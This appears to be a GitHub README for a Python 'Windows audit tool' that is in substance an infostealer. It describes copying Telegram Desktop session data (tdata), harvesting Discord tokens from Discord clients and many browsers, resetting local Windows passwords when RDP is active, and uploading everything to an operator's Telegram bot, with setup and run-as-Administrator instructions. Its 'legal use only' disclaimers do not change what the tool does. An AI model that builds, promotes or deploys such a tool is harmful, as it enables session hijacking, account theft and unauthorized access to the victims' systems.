# ⚡ Windows Session Extraction & RDP Audit Tool
### *Local artifact extraction, RDP state inspection, and Telegram report push.*

> ⚠️ **LEGAL USE ONLY**  
> For **authorized auditing, recovery, forensics, and research**  
> on systems **you own or have explicit permission to analyze**.

---

# 🔥 Overview
This tool performs a **full local audit** on Windows.  
It extracts session-related data, checks RDP status, attempts a local password reset (if RDP is active), and sends everything directly to a **Telegram bot**.

Fast. Raw. Straight to the point.

---

# 🚀 Core Functions

## 🖥 System Recon
- Username  
- OS version / build  
- Local IP  
- MAC address  
- Port scan: `3389`, `80`, `443`, `445`, `135`, `139`  

## 🔐 RDP Audit + Local Password Reset
- Detects if RDP (`TermService`) is running  
- Checks if port `3389` is open  
- If RDP is active → attempts **local Windows user password reset** (authorized recovery/testing)  

## 💬 Telegram Desktop Session Extraction
- Locates `tdata`  
- Copies to temp  
- Packs into a ZIP  
- Sends ZIP to Telegram bot  

## 🎮 Discord Token Scan (Local Storage)
Extracts locally stored Discord tokens from:

- Discord Stable / PTB / Canary  
- Chrome  
- Edge  
- Opera / Opera GX  
- Brave  
- Yandex  
- Other Chromium variants  
- Firefox profiles  

Tokens → saved → included in the ZIP archive.

## 📤 Telegram Bot Reporting
Bot receives:  
- Full Markdown audit report  
- Discord tokens (or summary)  
- Telegram `tdata` ZIP  
- Any errors collected during execution  

---

# ⚙️ Setup

## 1️⃣ Install Dependencies
```bash
pip install requests psutil
'''
2️⃣ Configure Telegram
At the top of the script:

```bash
TELEGRAM_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"
TELEGRAM_CHAT_ID = "YOUR_TELEGRAM_CHAT_ID"
If left default → script prompts once → auto-updates itself.
```bash

# 🚀 Usage

Run **as Administrator**, required for:  
✔ RDP checks  
✔ Password reset  
✔ Killing processes  
✔ Reading app data  

```bash
python main.py
```
When done:

Telegram receives full system report

Session ZIP is uploaded

Temp folders auto-clean

# 📌 Legit Use Cases
RDP audit on your own systems

Local forensics

Telegram Desktop session backup

Discord token storage analysis

Lab environments

Incident response

Windows artifact research

## 🚫 Not For
Unauthorized access

Account theft

Intrusions

Any illegal use

Use responsibly.

# 👤 Author
Mushaib (Mrexe)
GitHub: https://github.com/0xMush
